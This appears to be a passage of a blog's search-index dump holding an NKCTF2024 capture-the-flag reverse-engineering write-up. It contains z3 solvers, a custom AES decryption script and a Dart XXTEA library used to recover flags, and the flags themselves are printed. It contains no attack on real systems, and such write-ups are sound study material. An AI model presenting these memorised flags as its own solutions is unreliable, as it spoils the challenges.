for i in enc] print(bytes(ind)) break except: passplain"},{"title":"NKCTF2024 WP","path":"/2024/06/22/NKCTF2024-WP/","content":"login_systemz3解方程，换表aes 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371from z3 import *import binasciiimport reimport hashlibx = Solver()ans=[]a1 = [Int(&#x27;%d&#x27;%i) for i in range(16)]x.add(a1[2] + a1[1] + a1[0] + a1[3] == 447 , 101 * a1[2] + a1[0] + 9 * a1[1] + 8 * a1[3] == 12265 , 5 * a1[2] + 3 * a1[0] + 4 * a1[1] + 6 * a1[3] == 2000 , 88 * a1[2] + 12 * a1[0] + 11 * a1[1] + 87 * a1[3] == 21475 , a1[6] + 59 * a1[5] + 100 * a1[4] + a1[7] == 7896 , 443 * a1[4] + 200 * a1[5] + 10 * a1[6] + 16 * a1[7] == 33774 , 556 * a1[5] + 333 * a1[4] + 8 * a1[6] + 7 * a1[7] == 44758 , a1[6] + a1[5] + 202 * a1[4] + a1[7] == 9950 , 78 * a1[10] + 35 * a1[9] + 23 * a1[8] + 89 * a1[11] == 24052 , 78 * a1[8] + 59 * a1[9] + 15 * a1[10] + 91 * a1[11] == 25209 , 111 * a1[10] + 654 * a1[9] + 123 * a1[8] + 222 * a1[11] == 113427 , 6 * a1[9] + 72 * a1[8] + 5 * a1[10] + 444 * a1[11] == 54166 , 56 * a1[14] + 35 * a1[12] + 6 * a1[13] + 121 * a1[15] == 11130 , 169 * a1[14] + 158 * a1[13] + 98 * a1[12] + 124 * a1[15] == 27382 , 147 * a1[13] + 65 * a1[12] + 131 * a1[14] + 129 * a1[15] == 23564 , 137 * a1[14] + 132 * a1[13] + 620 * a1[12] + 135 * a1[15] == 51206)if x.check() == sat: model = x.model() for i in range(16): ans.append(model[a1[i]].as_long().real)username=&quot;&quot;.join(map(chr,ans))print(username)enc1=[0x7E, 0x5A, 0x6E, 0x77, 0x3A, 0x79, 0x35, 0x76, 0x7C]pre_pass=&quot;&quot;for i in range(len(enc1)): pre_pass+=chr((enc1[i]-9+i)^i)print(pre_pass)class AES:#128-ECB sbox = [0x31, 0x52, 0x5A, 0xC8, 0x0B, 0xAC, 0xF3, 0x3A, 0x8B, 0x54, 0x27, 0x9B, 0xAB, 0x95, 0xDE, 0x83, 0x60, 0xCB, 0x53, 0x7F, 0xC4, 0xE3, 0x0A, 0x97, 0xE0, 0x29, 0xD5, 0x68, 0xC5, 0xDF, 0xF4, 0x7B, 0xAA, 0xD6, 0x42, 0x78, 0x6C, 0xE9, 0x70, 0x17, 0xD7, 0x37, 0x24, 0x49, 0x75, 0xA9, 0x89, 0x67, 0x03, 0xFA, 0xD9, 0x91, 0xB4, 0x5B, 0xC2, 0x4E, 0x92, 0xFC, 0x46, 0xB1, 0x73, 0x08, 0xC7, 0x74, 0x09, 0xAF, 0xEC, 0xF5, 0x4D, 0x2D, 0xEA, 0xA5, 0xDA, 0xEF, 0xA6, 0x2B, 0x7E, 0x0C, 0x8F, 0xB0, 0x04, 0x06, 0x62, 0x84, 0x15, 0x8E, 0x12, 0x1D, 0x44, 0xC0, 0xE2, 0x38, 0xD4, 0x47, 0x28, 0x45, 0x6E, 0x9D, 0x63, 0xCF, 0xE6, 0x8C, 0x18, 0x82, 0x1B, 0x2C, 0xEE, 0x87, 0x94, 0x10, 0xC1, 0x20, 0x07, 0x4A, 0xA4, 0xEB, 0x77, 0xBC, 0xD3, 0xE1, 0x66, 0x2A, 0x6B, 0xE7, 0x79, 0xCC, 0x86, 0x16, 0xD0, 0xD1, 0x19, 0x55, 0x3C, 0x9F, 0xFB, 0x30, 0x98, 0xBD, 0xB8, 0xF1, 0x9E, 0x61, 0xCD, 0x90, 0xCE, 0x7C, 0x8D, 0x57, 0xAE, 0x6A, 0xB3, 0x3D, 0x76, 0xA7, 0x71, 0x88, 0xA2, 0xBA, 0x4F, 0x3E, 0x40, 0x64, 0x0F, 0x48, 0x21, 0x35, 0x36, 0x2F, 0xE8, 0x14, 0x5D, 0x51, 0xD8, 0xB5, 0xFE, 0xD2, 0x96, 0x93, 0xA1, 0xB6, 0x43, 0x0D, 0x4C, 0x80, 0xC9, 0xFF, 0xA3, 0xDD, 0x72, 0x05, 0x59, 0xBF, 0x0E, 0x26, 0x34, 0x1F, 0x13, 0xE5, 0xDC, 0xF2, 0xC6, 0x50, 0x1E, 0xE4, 0x85, 0xB7, 0x39, 0x8A, 0xCA, 0xED, 0x9C, 0xBB, 0x56, 0x23, 0x1A, 0xF0, 0x32, 0x58, 0xB2, 0x65, 0x33, 0x6F, 0x41, 0xBE, 0x3F, 0x6D, 0x11, 0x00, 0xAD, 0x5F, 0xC3, 0x81, 0x25, 0xA8, 0xA0, 0x9A, 0xF6, 0xF7, 0x5E, 0x99, 0x22, 0x2E, 0x4B, 0xF9, 0x3B, 0x02, 0x7A, 0xB9, 0x5C, 0x69, 0xF8, 0x1C, 0xDB, 0x01, 0x7D, 0xFD] s_box = &#123;&#125; ns_box = &#123; &#125; Rcon = &#123; 1: [&#x27;0x01&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 2: [&#x27;0x02&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 3: [&#x27;0x04&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 4: [&#x27;0x08&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 5: [&#x27;0x10&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 6: [&#x27;0x20&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 7: [&#x27;0x40&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 8: [&#x27;0x80&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 9: [&#x27;0x1B&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;], 10: [&#x27;0x36&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;, &#x27;0x00&#x27;] &#125; Matrix = [ [&#x27;0x02&#x27;, &#x27;0x03&#x27;, &#x27;0x01&#x27;, &#x27;0x01&#x27;], [&#x27;0x01&#x27;, &#x27;0x02&#x27;, &#x27;0x03&#x27;, &#x27;0x01&#x27;], [&#x27;0x01&#x27;, &#x27;0x01&#x27;, &#x27;0x02&#x27;, &#x27;0x03&#x27;], [&#x27;0x03&#x27;, &#x27;0x01&#x27;, &#x27;0x01&#x27;, &#x27;0x02&#x27;] ] ReMatrix = [ [&#x27;0x0e&#x27;, &#x27;0x0b&#x27;, &#x27;0x0d&#x27;, &#x27;0x09&#x27;], [&#x27;0x09&#x27;, &#x27;0x0e&#x27;, &#x27;0x0b&#x27;, &#x27;0x0d&#x27;], [&#x27;0x0d&#x27;, &#x27;0x09&#x27;, &#x27;0x0e&#x27;, &#x27;0x0b&#x27;], [&#x27;0x0b&#x27;, &#x27;0x0d&#x27;, &#x27;0x09&#x27;, &#x27;0x0e&#x27;] ] plaintext = [[], [], [], []] plaintext1 = [[], [], [], []] subkey = [[], [], [], []] def __init__(self, key):#密钥扩展 self.s_box = dict(zip([&quot;0x%02x&quot;%i for i in range(256)], [&quot;0x%02x&quot;%i for i in self.sbox])) self.ns_box = dict(zip(self.s_box.values(), self.s_box.keys())) for i in range(4): for j in range(0, 8, 2): self.subkey[i].append(&quot;0x&quot; + key[i * 8 + j:i * 8 + j + 2]) # print(self.subkey) for i in range(4, 44): if i % 4 != 0: tmp = xor_32(self.subkey[i - 1], self.subkey[i - 4],0) self.subkey.append(tmp) else: # 4的倍数的时候执行 tmp1 = self.subkey[i - 1][1:] tmp1.append(self.subkey[i - 1][0]) # print(tmp1) for m in range(4): tmp1[m] = self.s_box[tmp1[m]] # tmp1 = self.s_box[&#x27;cf&#x27;] tmp1 = xor_32(tmp1, self.Rcon[i / 4], 0) self.subkey.append(xor_32(tmp1, self.subkey[i - 4],0)) def AddRoundKey(self, round):#轮密钥加 for i in range(4): self.plaintext[i] = xor_32(self.plaintext[i], self.subkey[round * 4 + i],0) # print(&#x27;AddRoundKey&#x27;,self.plaintext) def PlainSubBytes(self): for i in range(4): for j in range(4): self.plaintext[i][j] = self.s_box[self.plaintext[i][j]] # print(&#x27;PlainSubBytes&#x27;,self.plaintext) def RePlainSubBytes(self): for i in range(4): for j in range(4): self.plaintext[i][j] = self.ns_box[self.plaintext[i][j]] def ShiftRows(self):#行移位 p1, p2, p3, p4 = self.plaintext[0][1], self.plaintext[1][1], self.plaintext[2][1], self.plaintext[3][1] self.plaintext[0][1] = p2 self.plaintext[1][1] = p3 self.plaintext[2][1] = p4 self.plaintext[3][1] = p1 p1, p2, p3, p4 = self.plaintext[0][2], self.plaintext[1][2], self.plaintext[2][2], self.plaintext[3][2] self.plaintext[0][2] = p3 self.plaintext[1][2] = p4 self.plaintext[2][2] = p1 self.plaintext[3][2] = p2 p1, p2, p3, p4 = self.plaintext[0][3], self.plaintext[1][3], self.plaintext[2][3], self.plaintext[3][3] self.plaintext[0][3] = p4 self.plaintext[1][3] = p1 self.plaintext[2][3] = p2 self.plaintext[3][3] = p3 # print(&#x27;ShiftRows&#x27;,self.plaintext) def ReShiftRows(self): p1, p2, p3, p4 = self.plaintext[0][1], self.plaintext[1][1], self.plaintext[2][1], self.plaintext[3][1] self.plaintext[3][1] = p3 self.plaintext[2][1] = p2 self.plaintext[0][1] = p4 self.plaintext[1][1] = p1 p1, p2, p3, p4 = self.plaintext[0][2], self.plaintext[1][2], self.plaintext[2][2], self.plaintext[3][2] self.plaintext[0][2] = p3 self.plaintext[1][2] = p4 self.plaintext[2][2] = p1 self.plaintext[3][2] = p2 p1, p2, p3, p4 = self.plaintext[0][3], self.plaintext[1][3], self.plaintext[2][3], self.plaintext[3][3] self.plaintext[0][3] = p2 self.plaintext[1][3] = p3 self.plaintext[2][3] = p4 self.plaintext[3][3] = p1 def MixColumns(self):#列混淆 for i in range(4): for j in range(4): self.plaintext1[i].append(MatrixMulti(self.Matrix[j], self.plaintext[i])) # print(&#x27;MixColumns&#x27;,self.plaintext1) def ReMixColumns(self): for i in range(4): for j in range(4): self.plaintext1[i].append(MatrixMulti(self.ReMatrix[j], self.plaintext[i])) def AESEncryption(self, plaintext): self.plaintext = [[], [], [], []] for i in range(4): for j in range(0, 8, 2): self.plaintext[i].append(&quot;0x&quot; + plaintext[i * 8 + j:i * 8 + j + 2]) self.AddRoundKey(0) for i in range(9): self.PlainSubBytes() self.ShiftRows() self.MixColumns() self.plaintext = self.plaintext1 self.plaintext1 = [[], [], [], []] self.AddRoundKey(i + 1) self.PlainSubBytes() self.ShiftRows() self.AddRoundKey(10) return Matrixtostr(self.plaintext) def AESDecryption(self, cipher): self.plaintext = [[], [], [], []] for i in range(4): for j in range(0, 8, 2): self.plaintext[i].append(&#x27;0x&#x27; + cipher[i * 8 + j:i * 8 + j + 2]) # print(self.ns_box) self.AddRoundKey(10) for i in range(9): self.ReShiftRows() self.RePlainSubBytes() self.AddRoundKey(9-i) self.ReMixColumns() self.plaintext = self.plaintext1 self.plaintext1 = [[], [], [], []] self.ReShiftRows() self.RePlainSubBytes() self.AddRoundKey(0) return Matrixtostr(self.plaintext) def Encryption(self, text): group = PlaintextGroup(TextToByte(text), 32, 1) # print(group) cipher = &quot;&quot; for i in range(len(group)): cipher = cipher + self.AESEncryption(group[i]) return cipher def Decryption(self, cipher): group = PlaintextGroup(cipher, 32, 0) # print(group) text = &#x27;&#x27; for i in range(len(group)): text = text + self.AESDecryption(group[i]) text = ByteToText(text) return textdef xor_32(start, end, key): a = [] for i in range(0, 4): xor_tmp = &quot;&quot; b = hextobin(start[i]) c = hextobin(end[i]) d = bin(key)[2:].rjust(8,&#x27;0&#x27;) for j in range(8): tmp = int(b[j], 10) ^ int(c[j], 10) ^ int(d[j],10) xor_tmp += str(tmp ) a.append(bintohex(xor_tmp)) return adef xor_8(begin, end): xor_8_tmp = &quot;&quot; for i in range(8): xor_8_tmp += str(int(begin[i]) ^ int(end[i])) return xor_8_tmpdef hextobin(word): word = bin(int(word, 16))[2:] for i in range(0, 8-len(word)): word = &#x27;0&#x27;+word return worddef bintohex(word): word = hex(int(word, 2)) if len(word) == 4: return word elif len(word) &lt; 4: return word.replace(&#x27;x&#x27;, &#x27;x0&#x27;)def MatrixMulti(s1, s2): result = [] s3 = [] for i in range(4): s3.append(hextobin(s2[i])) for i in range(4): result.append(MultiProcess(int(s1[i], 16), s3[i])) for i in range(3): result[0] = xor_8(result[0], result[i+1]) return bintohex(result[0])def MultiProcess(a, b): if a == 1: return b elif a == 2: if b[0] == &#x27;0&#x27;: b = b[1:] + &#x27;0&#x27; else: b = b[1:] + &#x27;0&#x27; b = xor_8(b, &#x27;00011011&#x27;) return b elif a == 3: tmp_b = b if b[0] == &#x27;0&#x27;: b = b[1:] + &#x27;0&#x27; else: b = b[1:] + &#x27;0&#x27; b = xor_8(b, &#x27;00011011&#x27;) return xor_8(b, tmp_b) elif a == 9: tmp_b = b return xor_8(tmp_b, MultiProcess(2, MultiProcess(2, MultiProcess(2, b)))) elif a == 11: tmp_b = b return xor_8(tmp_b, xor_8(MultiProcess(2, MultiProcess(2, MultiProcess(2, b))), MultiProcess(2, b))) elif a == 13: tmp_b = b return xor_8(tmp_b, xor_8(MultiProcess(2, MultiProcess(2, MultiProcess(2, b))), MultiProcess(2, MultiProcess(2, b)))) elif a == 14: return xor_8(MultiProcess(2, b), xor_8(MultiProcess(2, MultiProcess(2, MultiProcess(2, b))), MultiProcess(2, MultiProcess(2, b))))def Matrixtostr(matrix): result = &quot;&quot; for i in range(4): for j in range(4): result += matrix[i][j][2:] return resultdef PlaintextGroup(plaintext, length, flag): group = re.findall(&#x27;.&#123;&#x27;+str(length)+&#x27;&#125;&#x27;, plaintext) group.append(plaintext[len(group)*length:]) if group[-1] == &#x27;&#x27; and flag: group[-1] = &#x27;16161616161616161616161616161616&#x27; elif len(group[-1]) &lt; length and flag: tmp = int((length-len(group[-1])) / 2) if tmp &lt; 10: for i in range(tmp): group[-1] = group[-1] + &#x27;0&#x27;+str(tmp) else: for i in range(tmp): group[-1] = group[-1] + str(tmp) elif not flag: del group[-1] return group#字符串转16进制def TextToByte(words): text = words.encode(&#x27;utf-8&#x27;).hex() return textdef ByteToText(encode): tmp = int(encode[-2:]) word = &#x27;&#x27; for i in range(len(encode)-tmp*2): word = word + encode[i] # print(word) word = bytes.decode(binascii.a2b_hex(word)) return word#字节非轮异或def xorbytes(bytes1,bytes2): length=min(len(bytes1),len(bytes2)) output=bytearray() for i in range(length): output.append(bytes1[i]^bytes2[i]) return bytes(output)res=&#x27;B0CC93EAE92FEF5699396E023B4F9E42&#x27;.lower()key = &#x27;&#x27;for i in username: key+=hex(ord(i))[2:].rjust(2,&quot;0&quot;)A1 = AES(key)tail_pass=&quot;&quot;for i in range(0,len(res),32): tail_pass+=bytes.fromhex(A1.AESDecryption(res[i:i+32])).decode()print(tail_pass)print(hashlib.md5(str(username+pre_pass+&quot;_&quot;+tail_pass).encode(&quot;utf-8&quot;)).hexdigest()) NKCTF{2961bba0add6265ba83bc6198e0ec758} REEZ复现算法后z3求解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175from z3 import *x = Solver()num=25ans=[]v20 = [BitVec((&#x27;%d&#x27; % i),8) for i in range(25)]v45=v20[0]v44=v20[1]v43=v20[2]v42=v20[3]v41=v20[4]v40=v20[5]v39=v20[6]v38=v20[7]v37=v20[8]v36=v20[9]v35=v20[10]v34=v20[11]v33=v20[12]v32=v20[13]v31=v20[14]v30=v20[15]v29=v20[16]v28=v20[17]v27=v20[18]v26=v20[19]v25=v20[20]v24=v20[21]v23=v20[22]v22=v20[23]v21=v20[24]v45 = -105* (39* (2* (v45 &amp; (-105* (39* (2 * (v34 &amp; (-105 * (39 * (2 * (v35 &amp; 3) + (v35 ^ 3)) + 23) + 111))+ (v34 ^ (-105 * (39 * (2 * (v35 &amp; 3) + (v35 ^ 3)) + 23) + 111)))+ 23)+ 111))+ (v45 ^ (-105* (39* (2 * (v34 &amp; (-105 * (39 * (2 * (v35 &amp; 3) + (v35 ^ 3)) + 23) + 111)) + (v34 ^ (-105 * (39 * (2 * (v35 &amp; 3) + (v35 ^ 3)) + 23) + 111))) + 23) + 111))) + 23)+ 111v44 = -105 * (39 * (2 * ((v32 ^ v31) &amp; v44) + (v32 ^ v31 ^ v44)) + 23) + 111v43 = -105* (39 * (2 * (v43 &amp; (-105 * (39 * (2 * (v31 &amp; v30) + (v31 ^ v30)) + 23) + 111)) + (v43 ^ (-105 * (39 * (2 * (v31 &amp; v30) + (v31 ^ v30)) + 23) + 111))) + 23)+ 111v42 = -105 * (39 * (2 * ((v28 ^ 0x17) &amp; v42) + (v28 ^ 0x17 ^ v42)) + 23) + 111v41 = -105* (39 * (2 * (v41 &amp; (-105 * (39 * (2 * (v25 &amp; (-105 * (39 * (2 * (v36 &amp; 0xFB) + (v36 ^ 0xFB)) + 23) + 111)) + (v25 ^ (-105 * (39 * (2 * (v36 &amp; 0xFB) + (v36 ^ 0xFB)) + 23) + 111))) + 23) + 111)) + (v41 ^ (-105 * (39 * (2 * (v25 &amp; (-105 * (39 * (2 * (v36 &amp; 0xFB) + (v36 ^ 0xFB)) + 23) + 111)) + (v25 ^ (-105 * (39 * (2 * (v36 &amp; 0xFB) + (v36 ^ 0xFB)) + 23) + 111))) + 23) + 111))) + 23)+ 111v40 = -105 * (39 * (2 * (v40 &amp; (~v22 + v24 + 1)) + (v40 ^ (~v22 + v24 + 1))) + 23) + 111v39 = -105* (39 * (2 * (v39 &amp; (-105 * (39 * (2 * (v37 &amp; v38) + (v37 ^ v38)) + 23) + 111)) + (v39 ^ (-105 * (39 * (2 * (v37 &amp; v38) + (v37 ^ v38)) + 23) + 111))) + 23)+ 111v38 = -105* (39 * (2 * (v38 &amp; (-105 * (39 * (2 * ((~v25 + v22 + 1) &amp; 0x11) + ((~v25 + v22 + 1) ^ 0x11)) + 23) + 111)) + (v38 ^ (-105 * (39 * (2 * ((~v25 + v22 + 1) &amp; 0x11) + ((~v25 + v22 + 1) ^ 0x11)) + 23) + 111))) + 23)+ 111v37 = -105* (39 * (2 * (v37 &amp; (v26 ^ (-105 * (39 * (2 * (v27 &amp; 1) + (v27 ^ 1)) + 23) + 111))) + (v37 ^ v26 ^ (-105 * (39 * (2 * (v27 &amp; 1) + (v27 ^ 1)) + 23) + 111))) + 23)+ 111v36 = ~v29 + -105 * (39 * (2 * (v28 &amp; v36) + (v28 ^ v36)) + 23) + 111 + 1v35 = -105* (39 * (2 * (v35 &amp; (-105 * (39 * (2 * (v31 &amp; v30) + (v31 ^ v30)) + 23) + 111)) + (v35 ^ (-105 * (39 * (2 * (v31 &amp; v30) + (v31 ^ v30)) + 23) + 111))) + 23)+ 111v34 = -105* (39 * (2 * (v33 &amp; (-105 * (39 * (2 * (v32 &amp; (-105 * (39 * (2 * (v34 &amp; 0xF9) + (v34 ^ 0xF9)) + 23) + 111)) + (v32 ^ (-105 * (39 * (2 * (v34 &amp; 0xF9) + (v34 ^ 0xF9)) + 23) + 111))) + 23) + 111)) + (v33 ^ (-105 * (39 * (2 * (v32 &amp; (-105 * (39 * (2 * (v34 &amp; 0xF9) + (v34 ^ 0xF9)) + 23) + 111)) + (v32 ^ (-105 * (39 * (2 * (v34 &amp; 0xF9) + (v34 ^ 0xF9)) + 23) + 111))) + 23) + 111))) + 23)+ 111v33 = -105 * (39 * (2 * (v33 &amp; v34) + (v33 ^ v34)) + 23) + 111v32 = -105 * (39 * (2 * (v32 &amp; (v38 ^ v37)) + (v32 ^ v38 ^ v37)) + 23) + 111v31 = -105* (39 * (2 * (v40 &amp; (-105 * (39 * (2 * (v41 &amp; (-105 * (39 * (2 * (v31 &amp; 0xC) + (v31 ^ 0xC)) + 23) + 111)) + (v41 ^ (-105 * (39 * (2 * (v31 &amp; 0xC) + (v31 ^ 0xC)) + 23) + 111))) + 23) + 111)) + (v40 ^ (-105 * (39 * (2 * (v41 &amp; (-105 * (39 * (2 * (v31 &amp; 0xC) + (v31 ^ 0xC)) + 23) + 111)) + (v41 ^ (-105 * (39 * (2 * (v31 &amp; 0xC) + (v31 ^ 0xC)) + 23) + 111))) + 23) + 111))) + 23)+ 111v30 = -105* (39 * (2 * (v42 &amp; (-105 * (39 * (2 * (v30 &amp; 8) + (v30 ^ 8)) + 23) + 111)) + (v42 ^ (-105 * (39 * (2 * (v30 &amp; 8) + (v30 ^ 8)) + 23) + 111))) + 23)+ 111v29 = -105 * (39 * (2 * ((v43 ^ 0x4D) &amp; v29) + (v43 ^ 0x4D ^ v29)) + 23) + 111v28 = -105* (39 * (2 * (v28 &amp; (-105 * (39 * (2 * ((v44 ^ 0x17) &amp; 0xF9) + (v44 ^ 0xEE)) + 23) + 111)) + (v28 ^ (-105 * (39 * (2 * ((v44 ^ 0x17) &amp; 0xF9) + (v44 ^ 0xEE)) + 23) + 111))) + 23)+ 111v27 = -105 * (39 * (2 * ((v28 ^ v30) &amp; v27) + (v28 ^ v30 ^ v27)) + 23) + 111v26 = -105* (39 * (2 * (v33 &amp; (-105 * (39 * (2 * (v31 &amp; v26) + (v31 ^ v26)) + 23) + 111)) + (v33 ^ (-105 * (39 * (2 * (v31 &amp; v26) + (v31 ^ v26)) + 23) + 111))) + 23)+ 111v25 = -105 * (39 * (2 * (v25 &amp; v34) + (v25 ^ v34)) + 23) + 111v24 = -105* (39 * (2 * (v37 &amp; (-105 * (39 * (2 * (v24 &amp; v39) + (v24 ^ v39)) + 23) + 111)) + (v37 ^ (-105 * (39 * (2 * (v24 &amp; v39) + (v24 ^ v39)) + 23) + 111))) + 23)+ 111v23 = -105 * (39 * (2 * (v40 &amp; v23) + (v40 ^ v23)) + 23) + 111v22 = -105 * (39 * (2 * ((v45 ^ v43) &amp; v22) + (v45 ^ v43 ^ v22)) + 23) + 111v21 = -105* (39 * (2 * (v21 &amp; (-105 * (39 * (2 * (v44 &amp; 0x18) + (v44 ^ 0x18)) + 23) + 111)) + (v21 ^ (-105 * (39 * (2 * (v44 &amp; 0x18) + (v44 ^ 0x18)) + 23) + 111))) + 23)+ 111v20[0]=v45v20[1]=v44v20[2]=v43v20[3]=v42v20[4]=v41v20[5]=v40v20[6]=v39v20[7]=v38v20[8]=v37v20[9]=v36v20[10]=v35v20[11]=v34v20[12]=v33v20[13]=v32v20[14]=v31v20[15]=v30v20[16]=v29v20[17]=v28v20[18]=v27v20[19]=v26v20[20]=v25v20[21]=v24v20[22]=v23v20[23]=v22v20[24]=v21for i in range(25): v20[i]&amp;=0xffnv20=[0]*25dword=[0x00000000, 0xFFFFFFFE, 0xFFFFFFFF, 0x00000004, 0x00000001, 0xFFFFFFFF, 0x00000001, 0x00000000, 0x00000000, 0xFFFFFFFF, 0xFFFFFFFD, 0xFFFFFFFE, 0x00000000, 0xFFFFFFF6, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFE, 0x00000001, 0xFFFFFFF3, 0xFFFFFFFF, 0xFFFFFFFA, 0xFFFFFFFF, 0xFFFFFFFE, 0x00000001, 0xFFFFFFFE, 0x00000000, 0x00000000, 0x00000000]for i in range(5): for j in range(5): v13 = 0 for k in range(5): v3=((dword[5*i+k])*v20[5*k+j])&amp;0xff v9 = (-105 * (39 * (2 * (v13 &amp; v3) + (v13 ^ v3)) + 23) + 111)&amp;0xff v13 = v9 nv20[5*i+j]=v13enc=[118, 116, 245, 47, 83, 72, 116, 69, 164, 95, 252, 99, 1, 208, 248, 170, 121, 70, 17, 126, 29, 145, 126, 142, 202]for i in range(25): x.add(nv20[i]==enc[i])if x.check() == sat: model = x.model() print(model) NKCTF{THut_1Ss_s@_eAsyhh} EZNative用blutter的addNames.py和bindiff恢复符号表 容易看出是xxtea加密 动调找到密文密钥 看了眼算法没有魔改，但死活解不出来，一步一步跟汇编发现超过8字节没有溢出，刚好放出了提示，去搜了下xxtea dart 配置dart环境然后解密，刚配不知道怎么导库，直接把库粘进去 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181/*--------------------------------------------------------*\\| || xxtea.dart || || XXTEA encryption algorithm library for Dart. || || Encryption Algorithm Authors: || David J. Wheeler || Roger M. Needham || || Code Author: Ma Bingyao &lt;mabingyao@gmail.com&gt; || LastModified: Mar 11, 2021 || |\\*________________________________________________________*/library xxtea;import &#x27;dart:convert&#x27;;import &#x27;dart:core&#x27;;import &#x27;dart:typed_data&#x27;;const xxtea = XXTEA();Uint8List? xxteaEncrypt(dynamic data, dynamic key, &#123;bool includeLength = true&#125;) =&gt; xxtea.encrypt(data, key, includeLength: includeLength);Uint8List? xxteaDecrypt(dynamic data, dynamic key, &#123;bool includeLength = true&#125;) =&gt; xxtea.decrypt(data, key, includeLength: includeLength);String? xxteaEncryptToString(dynamic data, dynamic key, &#123;bool includeLength = true&#125;) =&gt; xxtea.encryptToString(data, key, includeLength: includeLength);String? xxteaDecryptToString(dynamic data, dynamic key, &#123;bool includeLength = true&#125;) =&gt; xxtea.decryptToString(data, key, includeLength: includeLength);class XXTEA &#123; static const _DELTA = 0x9E3779B9; const XXTEA(); Uint8List? _toUint8List(Uint32List v, bool includeLength) &#123; final length = v.length; var n = length &lt;&lt; 2; if (includeLength) &#123; final m = v[length - 1]; n -= 4; if ((m &lt; n - 3) || (m &gt; n)) &#123; return null; &#125; n = m; &#125; final bytes = Uint8List(n); for (var i = 0; i &lt; n; ++i) &#123; bytes[i] = v[i &gt;&gt; 2] &gt;&gt; ((i &amp; 3) &lt;&lt; 3); &#125; return bytes; &#125; Uint32List _toUint32List(Uint8List bytes, includeLength) &#123; final length = bytes.length; var n = length &gt;&gt; 2; if ((length &amp; 3) != 0) ++n; Uint32List v; if (includeLength) &#123; v = Uint32List(n + 1); v[n] = length; &#125; else &#123; v = Uint32List(n); &#125; for (var i = 0; i &lt; length; ++i) &#123; v[i &gt;&gt; 2] |= bytes[i] &lt;&lt; ((i &amp; 3) &lt;&lt; 3); &#125; return v; &#125; int _mx(int sum, int y, int z, int p, int e, Uint32List k) &#123; return ((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (k[p &amp; 3 ^ e] ^ z)); &#125; Uint8List _fixkey(Uint8List key) &#123; if (key.length &lt; 16) &#123; final k = Uint8List(16); k.setAll(0, key); return k; &#125; return key.sublist(0, 16); &#125; int _int(int i) &#123; return i &amp; 0xFFFFFFFF; &#125; Uint32List _encryptUint32List(Uint32List v, Uint32List k) &#123; final length = v.length; final n = length - 1; var y, z, sum, e, p, q; z = v[n]; sum = 0; for (q = 6 + (52 ~/ length); q &gt; 0; --q) &#123; sum = _int(sum + _DELTA); e = sum &gt;&gt; 2 &amp; 3; for (p = 0; p &lt; n; ++p) &#123; y = v[p + 1]; z = v[p] = _int(v[p] + _mx(sum, y, z, p, e, k)); &#125; y = v[0]; z = v[n] = _int(v[n] + _mx(sum, y, z, p, e, k)); &#125; return v; &#125; Uint32List _decryptUint32List(Uint32List v, Uint32List k) &#123; final length = v.length; final n = length - 1; var y, z, sum, e, p, q; y = v[0]; q = 6 + (52 ~/ length); for (sum = _int(q * _DELTA); sum != 0; sum = _int(sum - _DELTA)) &#123; e = sum &gt;&gt; 2 &amp; 3; for (p = n; p &gt; 0; --p) &#123; z = v[p - 1]; y = v[p] = _int(v[p] - _mx(sum, y, z, p, e, k)); &#125; z = v[n]; y = v[0] = _int(v[0] - _mx(sum, y, z, p, e, k)); &#125; return v; &#125; Uint8List? encrypt(dynamic data, dynamic key, &#123;bool includeLength = true&#125;) &#123; if (data is String) data = utf8.encode(data); if (key is String) key = utf8.encode(key); if (data == null || data.length == 0) &#123; return data; &#125; return _toUint8List( _encryptUint32List(_toUint32List(data, includeLength), _toUint32List(_fixkey(key), false)), false); &#125; String? encryptToString(dynamic data, dynamic key, &#123;bool includeLength = true&#125;) &#123; final encrypted = encrypt(data, key, includeLength: includeLength); if (encrypted != null) &#123; return base64.encode(encrypted); &#125; &#125; Uint8List? decrypt(dynamic data, dynamic key, &#123;bool includeLength = true&#125;) &#123; if (data is String) data = base64.decode(data); if (key is String) key = utf8.encode(key); if (data == null || data.length == 0) &#123; return data; &#125; return _toUint8List( _decryptUint32List( _toUint32List(data, false), _toUint32List(_fixkey(key), false)), includeLength); &#125; String? decryptToString(dynamic data, dynamic key, &#123;bool includeLength = true&#125;) &#123; final decrypted = decrypt(data, key, includeLength: includeLength); if (decrypted != 